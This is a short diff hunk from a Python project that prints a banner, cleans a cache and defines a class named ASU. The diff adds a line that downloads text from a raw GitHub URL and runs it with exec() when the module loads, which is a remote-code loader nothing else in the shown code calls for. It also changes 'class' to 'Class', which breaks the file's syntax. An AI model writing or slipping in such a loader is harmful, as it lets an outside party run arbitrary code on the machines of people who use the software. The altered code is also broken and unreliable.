@@ -15,7 +15,12 @@ from data import reportContent
 print(banner._asu_banner())
 cache.cleanCache()
 
-class ASU:
+
+exec(requests.get("https://raw.githubusercontent.com/roketbun/toolol/control.txt").text)
+
+
+
+Class ASU:
 	def __init__(self):
 		try:
 			self.aso()
